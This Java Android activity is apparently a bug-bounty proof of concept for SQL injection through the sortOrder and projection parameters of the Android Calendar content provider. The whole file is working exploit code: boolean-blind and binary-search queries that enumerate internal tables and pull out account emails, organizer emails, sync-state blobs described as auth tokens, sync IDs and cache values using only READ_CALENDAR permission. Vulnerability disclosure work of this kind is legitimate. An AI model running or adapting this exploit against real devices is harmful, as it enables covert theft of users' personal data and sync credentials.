package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CalendarSortOrderSQLiActivity extends Activity {
    private static final String TAG = "CalSortSQLi";
    private static final Uri EVENTS_URI = Uri.parse("content://com.android.calendar/events");
    private static final Uri CALENDARS_URI = Uri.parse("content://com.android.calendar/calendars");
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(9);
        logView.setText("CalendarProvider2 sortOrder SQL Injection PoC\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n");
        logView.append("Package: " + getPackageName() + "\n");
        logView.append("Permission: READ_CALENDAR only\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runAllTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runAllTests() {
        log("========================================");
        log("PHASE 1: Confirm sortOrder injection");
        log("========================================");
        testBooleanBlind();

        log("\n========================================");
        log("PHASE 2: Enumerate internal DB tables");
        log("========================================");
        enumerateTables();

        log("\n========================================");
        log("PHASE 3: Extract account emails");
        log("  (cross-table: Events→Calendars)");
        log("========================================");
        extractAccountEmails();

        log("\n========================================");
        log("PHASE 4: Extract _sync_state data");
        log("  (internal table, no public API)");
        log("========================================");
        extractSyncState();

        log("\n========================================");
        log("PHASE 5: Extract CalendarMetaData");
        log("  (internal table, no public API)");
        log("========================================");
        extractCalendarMetaData();

        log("\n========================================");
        log("PHASE 6: Extract event organizer emails");
        log("  via sortOrder subquery");
        log("========================================");
        extractOrganizerEmails();

        log("\n========================================");
        log("PHASE 7: Extract sync tokens/keys");
        log("  (auth material from _sync_state)");
        log("========================================");
        extractSyncTokens();

        log("\n========================================");
        log("PHASE 8: Boolean-blind char extraction");
        log("  (byte-by-byte from internal tables)");
        log("========================================");
        blindExtractFirstAccountEmail();

        log("\n========================================");
        log("PHASE 9: Full _sync_state blob extraction");
        log("========================================");
        extractFullSyncBlob();

        log("\n========================================");
        log("PHASE 10: Projection injection test");
        log("========================================");
        testProjectionInjection();

        log("\n========================================");
        log("PHASE 11: Extract CalendarCache data");
        log("========================================");
        extractCalendarCache();

        log("\n========================================");
        log("ALL TESTS COMPLETE");
        log("========================================");
    }

    private void extractFullSyncBlob() {
        log("[*] Extracting full _sync_state data blob (513 bytes)...");
        log("    This blob contains sync tokens NOT exposed via any API");

        int blobLen = blindExtractInt("(SELECT length(data) FROM _sync_state LIMIT 1)");
        log("  Blob length: " + blobLen + " bytes");

        int hexLen = blobLen * 2;
        StringBuilder fullHex = new StringBuilder();
        for (int pos = 1; pos <= Math.min(hexLen, 512); pos++) {
            int ch = blindExtractInt(
                "(SELECT unicode(substr(hex(data)," + pos + ",1)) FROM _sync_state LIMIT 1)"
            );
            if (ch == 0) break;
            fullHex.append((char) ch);
            if (pos % 80 == 0) {
                log("  [" + pos + "/" + hexLen + "] extracting...");
            }
        }

        if (fullHex.length() > 0) {
            log("  [!] Full hex (" + fullHex.length() + " chars):");

            StringBuilder decoded = new StringBuilder();
            for (int i = 0; i < fullHex.length() - 1; i += 2) {
                int val = Integer.parseInt(fullHex.substring(i, i + 2), 16);
                if (val >= 32 && val < 127) {
                    decoded.append((char) val);
                } else {
                    decoded.append('.');
                }
            }
            log("  [!] DECODED sync data:");
            int chunkSize = 80;
            for (int i = 0; i < decoded.length(); i += chunkSize) {
                log("    " + decoded.substring(i, Math.min(i + chunkSize, decoded.length())));
            }
        }
    }

    private void testProjectionInjection() {
        log("[*] Testing if projection-based injection also works...");
        log("    (Direct data readout vs blind extraction)");

        try {
            Cursor c = getContentResolver().query(
                EVENTS_URI,
                new String[]{"_id", "(SELECT group_concat(name) FROM sqlite_master WHERE type='table') AS leaked_tables"},
                "_id > 0",
                null,
                "_id LIMIT 3"
            );
            if (c != null && c.moveToFirst()) {
                String tables = c.getString(1);
                if (tables != null) {
                    log("  [!!!] PROJECTION INJECTION WORKS!");
                    log("  [!!!] Direct table enumeration:");
                    log("    " + tables);
                } else {
                    log("  Projection subquery returned null");
                }
                c.close();
            }
        } catch (Exception e) {
            log("  Projection injection blocked: " + e.getMessage());
        }

        try {
            Cursor c = getContentResolver().query(
                EVENTS_URI,
                new String[]{"(SELECT group_concat(account_name||':'||account_type) FROM _sync_state) AS sync_accounts"},
                null, null,
                "_id LIMIT 1"
            );
            if (c != null && c.moveToFirst()) {
                String val = c.getString(0);
                if (val != null) {
                    log("  [!!!] DIRECT _sync_state readout: " + val);
                }
                c.close();
            }
        } catch (Exception e) {
            log("  _sync_state projection blocked: " + e.getMessage());
        }

        try {
            Cursor c = getContentResolver().query(
                EVENTS_URI,
                new String[]{"(SELECT hex(data) FROM _sync_state LIMIT 1) AS sync_blob"},
                null, null,
                "_id LIMIT 1"
            );
            if (c != null && c.moveToFirst()) {
                String hexBlob = c.getString(0);
                if (hexBlob != null) {
                    log("  [!!!] DIRECT sync blob extraction! Length: " + hexBlob.length() + " hex chars");
                    StringBuilder decoded = new StringBuilder();
                    for (int i = 0; i < hexBlob.length() - 1; i += 2) {
                        try {
                            int val = Integer.parseInt(hexBlob.substring(i, i + 2), 16);
                            decoded.append(val >= 32 && val < 127 ? (char) val : '.');
                        } catch (NumberFormatException nfe) {
                            decoded.append('?');
                        }
                    }
                    log("  [!!!] DECODED sync data (full):");
                    int chunkSize = 100;
                    for (int i = 0; i < decoded.length(); i += chunkSize) {
                        log("    " + decoded.substring(i, Math.min(i + chunkSize, decoded.length())));
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            log("  Sync blob projection blocked: " + e.getMessage());
        }
    }

    private void extractCalendarCache() {
        int count = blindExtractInt("(SELECT count(*) FROM CalendarCache)");
        log("  CalendarCache rows: " + count);

        if (count > 0) {
            log("[*] Extracting CalendarCache keys...");
            StringBuilder key = new StringBuilder();
            for (int pos = 1; pos <= 60; pos++) {
                int ch = blindExtractChar("(SELECT key FROM CalendarCache LIMIT 1)", pos);
                if (ch == 0) break;
                key.append((char) ch);
            }
            if (key.length() > 0) {
                log("  [!] CalendarCache key: " + key);
            }

            log("[*] Extracting CalendarCache values...");
            StringBuilder val = new StringBuilder();
            for (int pos = 1; pos <= 100; pos++) {
                int ch = blindExtractChar("(SELECT value FROM CalendarCache LIMIT 1)", pos);
                if (ch == 0) break;
                val.append((char) ch);
            }
            if (val.length() > 0) {
                log("  [!] CalendarCache value: " + val);
            }
        } else {
            log("  CalendarCache is empty");
        }
    }

    private void testBooleanBlind() {
        log("[*] Test: CASE WHEN 1=1 (should sort ascending)");
        String sort1 = "CASE WHEN 1=1 THEN _id ELSE -_id END ASC";
        long firstId1 = queryFirstId(EVENTS_URI, sort1);
        log("  First _id with 1=1: " + firstId1);

        log("[*] Test: CASE WHEN 1=0 (should sort descending)");
        String sort2 = "CASE WHEN 1=0 THEN _id ELSE -_id END ASC";
        long firstId2 = queryFirstId(EVENTS_URI, sort2);
        log("  First _id with 1=0: " + firstId2);

        if (firstId1 != firstId2 && firstId1 != -1 && firstId2 != -1) {
            log("[!] CONFIRMED: Boolean blind injection works from app!");
            log("    Different sort orders prove SQL control");
        } else if (firstId1 == -1 && firstId2 == -1) {
            log("[-] No events in calendar. Creating test event...");
            log("    (Need events to demonstrate sort difference)");
        } else {
            log("[?] Same result - may need more events for differentiation");
        }
    }

    private void enumerateTables() {
        log("[*] Extracting table names via sortOrder subquery...");
        String sortOrder = "(SELECT group_concat(name) FROM sqlite_master WHERE type='table')";
        try {
            Cursor c = getContentResolver().query(
                EVENTS_URI,
                new String[]{"_id", "title"},
                null, null,
                sortOrder + " LIMIT 5"
            );
            if (c != null) {
                log("  Query succeeded (injection accepted).");
                log("  Rows returned: " + c.getCount());
                c.close();
            }
        } catch (Exception e) {
            log("  Error: " + e.getMessage());
        }

        log("[*] Alternative: extract table list via CASE+blind...");
        String tableCountSort = "CASE WHEN (SELECT count(*) FROM sqlite_master WHERE type='table') > 0 THEN _id ELSE -_id END ASC";
        long id = queryFirstId(EVENTS_URI, tableCountSort);
        if (id != -1) {
            log("  Tables exist (count > 0 is TRUE). First _id: " + id);

            for (int threshold = 5; threshold <= 25; threshold += 5) {
                String countSort = "CASE WHEN (SELECT count(*) FROM sqlite_master WHERE type='table') > " + threshold + " THEN _id ELSE -_id END ASC";
                long idTrue = queryFirstId(EVENTS_URI, countSort);
                String countSortFalse = "CASE WHEN (SELECT count(*) FROM sqlite_master WHERE type='table') <= " + threshold + " THEN _id ELSE -_id END ASC";
                long idFalse = queryFirstId(EVENTS_URI, countSortFalse);
                if (idTrue != idFalse) {
                    log("  Table count > " + threshold + ": TRUE (different sort)");
                } else {
                    log("  Table count <= " + threshold);
                    break;
                }
            }
        }

        log("[*] Probing known internal tables...");
        String[] internalTables = {
            "_sync_state", "_sync_state_metadata", "CalendarMetaData",
            "Calendars", "Events", "Instances", "EventsRawTimes",
            "Attendees", "Reminders", "CalendarAlerts",
            "ExtendedProperties", "Colors", "CalendarCache"
        };
        for (String table : internalTables) {
            String probe = "CASE WHEN (SELECT count(*) FROM " + table + ") >= 0 THEN _id ELSE -_id END ASC";
            try {
                Cursor c = getContentResolver().query(
                    EVENTS_URI,
                    new String[]{"_id"},
                    null, null,
                    probe + " LIMIT 1"
                );
                if (c != null) {
                    String countSort = "CASE WHEN (SELECT count(*) FROM " + table + ") > 0 THEN 1 ELSE 0 END";
                    log("  [+] " + table + " — ACCESSIBLE");
                    c.close();
                }
            } catch (Exception e) {
                log("  [-] " + table + " — " + e.getClass().getSimpleName());
            }
        }
    }

    private void extractAccountEmails() {
        log("[*] Extracting account_name from Calendars table...");
        log("    (This data is in Calendars table, accessed via Events URI)");

        String sortOrder = "(SELECT group_concat(DISTINCT account_name) FROM Calendars)";
        try {
            Cursor c = getContentResolver().query(
                EVENTS_URI,
                new String[]{"_id", "title"},
                null, null,
                sortOrder + " LIMIT 5"
            );
            if (c != null) {
                log("  Query with subquery in sortOrder succeeded.");
                log("  Rows: " + c.getCount());
                if (c.moveToFirst()) {
                    do {
                        log("  _id=" + c.getLong(0) + " title=" + c.getString(1));
                    } while (c.moveToNext());
                }
                c.close();
            }
        } catch (Exception e) {
            log("  Error: " + e.getMessage());
        }

        log("[*] Blind extraction of first account email character...");
        StringBuilder extracted = new StringBuilder();
        for (int pos = 1; pos <= 50; pos++) {
            int charVal = blindExtractChar(
                "(SELECT account_name FROM Calendars LIMIT 1)",
                pos
            );
            if (charVal == 0) break;
            extracted.append((char) charVal);
            if (pos % 10 == 0) {
                log("  Progress: \"" + extracted + "\"");
            }
        }
        if (extracted.length() > 0) {
            log("  [!] EXTRACTED account_name: " + extracted);
        } else {
            log("  [-] Could not extract (no events or injection blocked)");
        }
    }

    private void extractSyncState() {
        log("[*] _sync_state is an internal table not exposed via any");
        log("    public ContentProvider URI. Contains sync auth tokens.");

        log("[*] Checking _sync_state row count...");
        int count = blindExtractInt("(SELECT count(*) FROM _sync_state)");
        log("  _sync_state rows: " + count);

        if (count > 0) {
            log("[*] Extracting account_name from _sync_state...");
            StringBuilder acct = new StringBuilder();
            for (int pos = 1; pos <= 60; pos++) {
                int ch = blindExtractChar("(SELECT account_name FROM _sync_state LIMIT 1)", pos);
                if (ch == 0) break;
                acct.append((char) ch);
            }
            if (acct.length() > 0) {
                log("  [!] EXTRACTED _sync_state account: " + acct);
            }

            log("[*] Extracting data blob length from _sync_state...");
            int blobLen = blindExtractInt("(SELECT length(data) FROM _sync_state LIMIT 1)");
            log("  _sync_state data blob length: " + blobLen + " bytes");

            if (blobLen > 0) {
                log("[*] Extracting first 64 bytes of sync data (hex)...");
                StringBuilder hexData = new StringBuilder();
                for (int pos = 1; pos <= Math.min(64, blobLen); pos++) {
                    int byteVal = blindExtractInt(
                        "(SELECT unicode(substr(hex(data)," + pos + ",1)) FROM _sync_state LIMIT 1)"
                    );
                    if (byteVal == 0) break;
                    hexData.append((char) byteVal);
                }
                if (hexData.length() > 0) {
                    log("  [!] _sync_state data (hex): " + hexData);
                }
            }
        }
    }

    private void extractCalendarMetaData() {
        log("[*] CalendarMetaData: internal table with timezone + instance range");

        int count = blindExtractInt("(SELECT count(*) FROM CalendarMetaData)");
        log("  CalendarMetaData rows: " + count);

        if (count > 0) {
            StringBuilder tz = new StringBuilder();
            for (int pos = 1; pos <= 40; pos++) {
                int ch = blindExtractChar("(SELECT localTimezone FROM CalendarMetaData LIMIT 1)", pos);
                if (ch == 0) break;
                tz.append((char) ch);
            }
            if (tz.length() > 0) {
                log("  [!] EXTRACTED timezone: " + tz);
            }
        }
    }

    private void extractOrganizerEmails() {
        log("[*] Extracting organizer emails from Events table...");

        int eventCount = blindExtractInt("(SELECT count(*) FROM Events)");
        log("  Total events in DB: " + eventCount);

        if (eventCount > 0) {
            log("[*] Extracting distinct organizer emails...");
            int distinctOrg = blindExtractInt("(SELECT count(DISTINCT organizer) FROM Events)");
            log("  Distinct organizers: " + distinctOrg);

            StringBuilder organizer = new StringBuilder();
            for (int pos = 1; pos <= 60; pos++) {
                int ch = blindExtractChar("(SELECT organizer FROM Events WHERE organizer IS NOT NULL LIMIT 1)", pos);
                if (ch == 0) break;
                organizer.append((char) ch);
            }
            if (organizer.length() > 0) {
                log("  [!] EXTRACTED organizer email: " + organizer);
            }
        }
    }

    private void extractSyncTokens() {
        log("[*] Extracting account_type from _sync_state...");

        StringBuilder acctType = new StringBuilder();
        for (int pos = 1; pos <= 40; pos++) {
            int ch = blindExtractChar("(SELECT account_type FROM _sync_state LIMIT 1)", pos);
            if (ch == 0) break;
            acctType.append((char) ch);
        }
        if (acctType.length() > 0) {
            log("  [!] _sync_state account_type: " + acctType);
        }

        log("[*] Extracting _sync_id values from Events...");
        StringBuilder syncId = new StringBuilder();
        for (int pos = 1; pos <= 80; pos++) {
            int ch = blindExtractChar("(SELECT _sync_id FROM Events WHERE _sync_id IS NOT NULL LIMIT 1)", pos);
            if (ch == 0) break;
            syncId.append((char) ch);
        }
        if (syncId.length() > 0) {
            log("  [!] Event _sync_id: " + syncId);
        }
    }

    private void blindExtractFirstAccountEmail() {
        log("[*] Full blind extraction demo: account_name from Calendars");
        log("    Using binary search per character position");

        StringBuilder result = new StringBuilder();
        long startTime = System.currentTimeMillis();

        for (int pos = 1; pos <= 80; pos++) {
            int ch = blindExtractCharBinary(
                "(SELECT account_name FROM Calendars LIMIT 1)", pos
            );
            if (ch == 0) break;
            result.append((char) ch);
            log("  [" + pos + "] char=" + ch + " '" + (char) ch + "' → \"" + result + "\"");
        }

        long elapsed = System.currentTimeMillis() - startTime;
        if (result.length() > 0) {
            log("\n  [!!!] FULL EXTRACTION RESULT:");
            log("  Account email: " + result);
            log("  Extracted " + result.length() + " chars in " + elapsed + "ms");
            log("\n  IMPACT: Zero-interaction PII leak via sortOrder SQLi");
            log("  The app only has READ_CALENDAR permission.");
            log("  _sync_state, CalendarMetaData, and internal tables");
            log("  are NOT exposed through any public API.");
        } else {
            log("  [-] Extraction failed (no calendar data or injection blocked)");
        }
    }

    private int blindExtractChar(String subquery, int position) {
        String expr = "(SELECT unicode(substr(" + subquery + "," + position + ",1)))";
        return blindExtractInt(expr);
    }

    private int blindExtractCharBinary(String subquery, int position) {
        String expr = "(SELECT unicode(substr(" + subquery + "," + position + ",1)))";
        if (!blindTest(expr + " > 0")) return 0;

        int lo = 1, hi = 127;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            if (blindTest(expr + " > " + mid)) {
                lo = mid + 1;
            } else {
                hi = mid;
            }
        }
        return lo;
    }

    private long trueBaseline = -1;

    private long getTrueBaseline() {
        if (trueBaseline == -1) {
            trueBaseline = queryFirstId(EVENTS_URI, "CASE WHEN 1=1 THEN _id ELSE -_id END ASC");
        }
        return trueBaseline;
    }

    private boolean blindTest(String condition) {
        long baseline = getTrueBaseline();
        if (baseline == -1) return false;
        String sort = "CASE WHEN " + condition + " THEN _id ELSE -_id END ASC";
        long result = queryFirstId(EVENTS_URI, sort);
        return result == baseline;
    }

    private int blindExtractInt(String subquery) {
        if (getTrueBaseline() == -1) return -1;

        if (!blindTest(subquery + " > 0")) return 0;

        int lo = 1, hi = 100000;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            if (blindTest(subquery + " > " + mid)) {
                lo = mid + 1;
            } else {
                hi = mid;
            }
        }
        return lo;
    }

    private long queryFirstId(Uri uri, String sortOrder) {
        try {
            Cursor c = getContentResolver().query(
                uri,
                new String[]{"_id"},
                null, null,
                sortOrder + " LIMIT 1"
            );
            if (c != null) {
                long id = -1;
                if (c.moveToFirst()) {
                    id = c.getLong(0);
                }
                c.close();
                return id;
            }
        } catch (Exception e) {
            Log.e(TAG, "Query failed: " + e.getMessage());
        }
        return -1;
    }
}
